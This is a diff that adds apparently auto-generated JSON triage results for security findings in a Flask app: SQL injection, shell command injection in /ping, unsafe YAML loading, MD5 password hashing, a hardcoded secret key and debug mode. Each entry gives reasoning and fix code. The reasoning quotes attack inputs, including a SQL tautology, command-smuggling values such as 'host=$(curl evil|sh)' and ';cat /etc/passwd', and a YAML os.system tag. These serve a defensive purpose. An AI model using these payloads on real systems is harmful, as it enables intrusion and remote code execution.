@@ -1,0 +1,65 @@
+{
+  "92d399f1e2": {
+    "summary": "Flask SECRET_KEY is hardcoded as a weak, guessable string in source code.",
+    "severity": "high",
+    "verdict": "true_positive",
+    "reasoning": "app.config[\"SECRET_KEY\"] is set to the literal \"super-secret-key-12345\". Flask uses this key to sign session cookies. Anyone who can read the source or repository, or who guesses this weak value, can forge session cookies and impersonate users. The value is a real production-style config assignment, not a test fixture or placeholder. The key should come from the environment or a secrets manager, and the app should fail at startup if it is missing. The fix reads it from FLASK_SECRET_KEY. The hardcoded value should also be treated as compromised and rotated. The other issues in the file (SQL injection, command injection, unsafe YAML, MD5, debug=True) are separate findings.",
+    "fix_code": "import os\n\napp = Flask(__name__)\n\n# Load the secret key from the environment; fails fast if it is not set.\napp.config[\"SECRET_KEY\"] = os.environ[\"FLASK_SECRET_KEY\"]"
+  },
+  "14c40c4afe": {
+    "summary": "User-controlled `name` query parameter is concatenated directly into a SQL string and executed, which allows SQL injection.",
+    "severity": "high",
+    "verdict": "true_positive",
+    "reasoning": "`username` comes from `request.args.get(\"name\")`, and nothing sanitizes it. It is concatenated into the query on line 23, and `db.execute(query)` then runs it. An attacker can send `name=' OR '1'='1` to dump the whole users table. They can also use UNION-based injection to read other tables. sqlite3's `execute` rejects multiple statements, so stacked queries aren't possible, but data exfiltration is still possible. The endpoint needs no authentication and returns the rows directly in the response. The fix is a parameterized query. Because the fix must replace only the flagged line, the new line builds the query string with a `?` placeholder. The call on line 24 would also need to pass `(username,)`, for example `db.execute(query, (username,))`. Line 24 is outside the flagged range, so I did not change it.",
+    "fix_code": "    query = \"SELECT * FROM users WHERE name = ?\""
+  },
+  "1818a825b3": {
+    "summary": "Command injection in /ping: the unvalidated `host` query parameter is concatenated into a shell command run with shell=True.",
+    "severity": "critical",
+    "verdict": "true_positive",
+    "reasoning": "`host` comes straight from request.args and is concatenated into a string that is run through the shell (shell=True). There is no validation or sanitization. A request like `/ping?host=localhost;id` or `host=$(curl evil|sh)` runs arbitrary commands as the web server user. The endpoint is unauthenticated and reachable remotely. The fix is to avoid the shell by passing an argument list. A `--` separator stops the value from being read as an option, and a hostname/IP check rejects anything unexpected. The replacement lines also add a timeout. Because the fix must replace exactly the flagged line, the validation is written inline, and the code returns a 400 response if the host is invalid.",
+    "fix_code": "    import re, ipaddress\n    try:\n        ipaddress.ip_address(host)\n        valid = True\n    except ValueError:\n        valid = bool(re.fullmatch(r\"[A-Za-z0-9]([A-Za-z0-9.-]{0,251}[A-Za-z0-9])?\", host))\n    if not valid:\n        return {\"error\": \"invalid host\"}, 400\n    result = subprocess.run([\"ping\", \"-c\", \"1\", \"--\", host], shell=False, capture_output=True, timeout=10)"
+  },
+  "41a985e07a": {
+    "summary": "Command injection in /ping: the unvalidated `host` query parameter is concatenated into a shell command run with shell=True.",
+    "severity": "critical",
+    "verdict": "true_positive",
+    "reasoning": "`host` comes straight from request.args, with no validation. It is concatenated into a string and run through the shell (shell=True). An attacker can send `host=127.0.0.1;cat /etc/passwd` or use `$(...)` or backticks to run arbitrary commands as the web app's user. The endpoint is unauthenticated and the output is returned to the caller, so exploitation is trivial and the results are visible. The fix is to avoid the shell and pass an argument list. A \"--\" separator stops a value starting with \"-\" from being read as an option, and a timeout stops requests hanging. Ideally the host would also be validated against a hostname or IP allowlist or regex before this call. The fix below keeps the replacement to the flagged line only.",
+    "fix_code": "    result = subprocess.run([\"ping\", \"-c\", \"1\", \"--\", host], shell=False, capture_output=True, timeout=10)"
+  },
+  "38481f3fd5": {
+    "summary": "OS command injection in /ping: unauthenticated user-controlled `host` query parameter is concatenated into a shell command run with shell=True.",
+    "severity": "critical",
+    "verdict": "true_positive",
+    "reasoning": "The `host` value comes straight from request.args with no validation and is concatenated into a command string executed through a shell. A request like `/ping?host=localhost;cat /etc/passwd` or `$(...)` runs arbitrary commands as the web app user. The endpoint has no authentication, and the app runs with debug=True, which makes things worse. The flagged line is exploitable. The fix is to pass an argument list with shell=False. Use `--` so a value starting with `-` can't be parsed as an option, and add a timeout. Ideally also validate the host against a hostname/IP allowlist or regex. The replacement below is a drop-in for the flagged line and doesn't rely on extra validation, because shell metacharacters are no longer interpreted. Argument injection is blocked by `--`.",
+    "fix_code": "    result = subprocess.run([\"ping\", \"-c\", \"1\", \"--\", host], shell=False, capture_output=True, timeout=10)"
+  },
+  "064a67f727": {
+    "summary": "yaml.load with yaml.Loader on raw POST body in a Flask endpoint allows arbitrary Python object construction and code execution.",
+    "severity": "critical",
+    "verdict": "true_positive",
+    "reasoning": "The /config route passes request.data, which is fully attacker-controlled, to yaml.load with the full yaml.Loader. That loader supports Python-specific tags such as !!python/object/apply:os.system, so a single unauthenticated POST can run arbitrary commands on the server. The route has no authentication, and the code gives no indication of any sanitization or mitigation. The finding is a true positive and the impact is remote code execution. Switching to yaml.safe_load limits parsing to plain data types (dicts, lists, strings, numbers) and removes the risk.",
+    "fix_code": "    data = yaml.safe_load(request.data)"
+  },
+  "b14d6321d7": {
+    "summary": "MD5 is used to hash user passwords in the /register endpoint, which is unsuitable for password storage.",
+    "severity": "high",
+    "verdict": "true_positive",
+    "reasoning": "The flagged line hashes a user-supplied password with unsalted MD5 and returns the hash. This is a password-storage use case, not a non-security checksum. MD5 is extremely fast and unsalted, so leaked hashes can be cracked with rainbow tables or GPU brute force. Returning the hash to the client is also questionable, though that is outside this finding. The fix uses a salted, deliberately slow KDF from the standard library (scrypt). The salt is random per password and is stored alongside the hash. A dedicated library such as bcrypt or argon2 would also work. The fix needs only hashlib and os, and the replacement uses the fully qualified `__import__('os')` so that no new top-level import is needed. Adding `import os` at the top of the file is cleaner.",
+    "fix_code": "    salt = __import__(\"os\").urandom(16)\n    hashed = salt.hex() + \"$\" + hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1).hex()"
+  },
+  "1c9e3561d0": {
+    "summary": "MD5 is used to hash a user-supplied password in the /register endpoint, with no salt and a fast hash.",
+    "severity": "high",
+    "verdict": "true_positive",
+    "reasoning": "The value hashed comes from request.form[\"password\"] and the variable is a password. The endpoint returns the digest, so it is clearly intended as a password hash. MD5 is fast and unsalted here, so the digest can be cracked with rainbow tables or GPU brute force. Identical passwords also give identical hashes. The endpoint also returns the hash to the caller, which is poor practice, but that is a separate issue. This is not a false positive. The fix uses hashlib.scrypt with a random per-password salt and stores the salt with the derived key. It needs only the standard library and replaces just the flagged line. `os` must be imported, or `secrets` used. To keep the fix self-contained, I used `__import__(\"os\")`. Ideally, add `import os` at the top of the file.",
+    "fix_code": "    salt = __import__(\"os\").urandom(16)\n    hashed = salt.hex() + \"$\" + hashlib.scrypt(password.encode(), salt=salt, n=2**14, r=8, p=1).hex()"
+  },
+  "731f897acd": {
+    "summary": "Flask app started with debug=True, which enables the Werkzeug interactive debugger (remote code execution if exposed) and leaks stack traces.",
+    "severity": "high",
+    "verdict": "true_positive",
+    "reasoning": "The app.run(debug=True) call is in the `__main__` block, so it only takes effect when the file is run directly and not under a WSGI server such as gunicorn. That reduces the likelihood somewhat. The flag is still hardcoded, so any deployment that starts the file with `python app.py` exposes the Werkzeug interactive debugger. The debugger allows arbitrary code execution, though it is PIN-protected. It also leaks source and stack traces. This app also has several other serious flaws: SQL injection, command injection with shell=True, and unsafe yaml.Loader. Those make debug-mode exposure more dangerous, because an attacker who triggers an error gets detailed information to work with. The fix is to drive debug from an environment variable that defaults to off, and to bind to localhost.",
+    "fix_code": "    import os\n    app.run(debug=os.environ.get(\"FLASK_DEBUG\", \"0\") == \"1\", host=\"127.0.0.1\")"
+  }
+}
